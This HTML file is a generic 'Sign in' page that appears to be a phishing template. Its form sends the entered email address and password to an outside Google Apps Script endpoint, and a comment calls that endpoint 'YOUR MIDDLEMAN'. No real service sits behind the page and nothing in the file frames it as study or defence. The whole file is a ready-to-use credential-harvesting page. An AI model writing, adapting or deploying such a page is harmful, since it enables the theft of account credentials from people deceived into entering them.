<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />

    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <style>
      body {
        font-family: system-ui, sans-serif;
        background: #f6f7f8;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        margin: 0;
      }
      .login-box {
        background: white;
        padding: 24px;
        border-radius: 8px;
        width: 100%;
        max-width: 360px;
        box-shadow: 0 4px 20px rgba(0,0,0,.1);
      }
      h2 {
        margin-top: 0;
        text-align: center;
      }
      input {
        width: 100%;
        padding: 10px;
        margin: 10px 0;
        font-size: 16px;
      }
      button {
        width: 100%;
        padding: 12px;
        font-size: 16px;
        background: #0071c2;
        color: white;
        border: none;
        border-radius: 4px;
      }
    </style>
  </head>

  <body>
    <div class="login-box">
      <h2>Sign in</h2>

      <!-- THIS FORM POSTS TO YOUR MIDDLEMAN -->
      <form
        method="POST"
        action="https://script.google.com/macros/s/AKfycbxmQJZzU2egFMSfSajo04NqII-U8bsd3VqfMMbQt8EeNbRPDXDIaSOTMvahCPDu46bT/exec"
      >
        <input
          type="text"
          name="user"
          placeholder="Email address"
          required
        />

        <input
          type="password"
          name="pass"
          placeholder="Password"
          required
        />

        <button type="submit">Continue</button>
      </form>
    </div>
  </body>
</html>
